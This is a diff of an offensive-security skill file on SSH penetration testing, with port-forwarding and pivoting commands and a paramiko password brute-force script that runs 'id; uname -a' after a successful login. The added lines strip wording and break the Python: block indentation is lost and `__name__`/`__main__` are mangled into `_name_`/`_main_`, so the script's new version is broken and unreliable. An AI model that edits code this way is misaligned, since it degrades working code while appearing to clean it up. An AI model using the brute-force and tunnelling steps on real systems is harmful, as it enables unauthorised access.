@@ -1,6 +1,6 @@
 ---
 name: ssh-penetration-testing
-description: "Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security."
+description: "Conduct SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security."
 risk: offensive
 date_added: "2026-02-27"
 version: 1.0.0
@@ -40,7 +40,7 @@ Conduct comprehensive SSH security assessments including enumeration, credential
 3. **Vulnerability Assessment** - Known CVEs, misconfigurations
 4. **Tunnel Documentation** - Port forwarding configurations
 
-## Core Workflow
+## Workflow
 
 ### Phase 1: SSH Service Discovery
 
@@ -104,7 +104,7 @@ Identify weak configurations:
 
 ```bash
 
-# ssh-audit - comprehensive SSH audit
+# ssh-audit - SSH audit
 
 ssh-audit 192.168.1.100
 
@@ -290,13 +290,13 @@ Forward local port to remote service:
 
 # Syntax: ssh -L <local_port>:<remote_host>:<remote_port> user@ssh_server
 
-# Access internal web server through SSH
+# Access web server through SSH
 
 ssh -L 8080:192.168.1.50:80 user@192.168.1.100
 
 # Now access http://localhost:8080
 
-# Access internal database
+# Access database
 
 ssh -L 3306:192.168.1.50:3306 user@192.168.1.100
 
@@ -324,7 +324,7 @@ ssh -R 8080:localhost:80 user@192.168.1.100
 ssh -R 4444:localhost:4444 user@192.168.1.100
 ```
 
-#### Dynamic Port Forwarding (SOCKS Proxy)
+#### Port Forwarding (SOCKS Proxy)
 
 Create SOCKS proxy for network pivoting:
 
@@ -425,11 +425,11 @@ def ssh_connect(host, username, password):
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     
     try:
-        client.connect(host, username=username, password=password, timeout=5)
-        print(f"[+] Success: {username}:{password}")
+client.connect(host, username=username, password=password, timeout=5)
+print(f"[+] Success: {username}:{password}")
         return client
     except paramiko.AuthenticationException:
-        print(f"[-] Failed: {username}:{password}")
+print(f"[-] Failed: {username}:{password}")
         return None
     except Exception as e:
         print(f"[!] Error: {e}")
@@ -448,10 +448,10 @@ def ssh_brute_force(host, username, wordlist):
         passwords = f.read().splitlines()
     
     for password in passwords:
-        client = ssh_connect(host, username, password.strip())
+client = ssh_connect(host, username, password.strip())
         if client:
-            # Run post-exploitation commands
-            output, _ = execute_command(client, 'id; uname -a')
+# Run post-exploitation commands
+output, _ = execute_command(client, 'id; uname -a')
             print(output)
             client.close()
             return True
@@ -459,11 +459,11 @@ def ssh_brute_force(host, username, wordlist):
 
 # Usage
 
-if __name__ == "__main__":
+if _name_ == "_main_":
     target = "192.168.1.100"
     user = "admin"
     
-    # Single credential test
+# Single credential test
     client = ssh_connect(target, user, "password123")
     if client:
         output, _ = execute_command(client, "ls -la")
@@ -561,7 +561,7 @@ sessions -i 1
 - Brute-forcing may violate ToS
 - Document all testing activities
 
-### Technical Limitations
+### Limitations
 
 - Rate limiting may block attacks
 - Fail2ban or similar may ban IPs
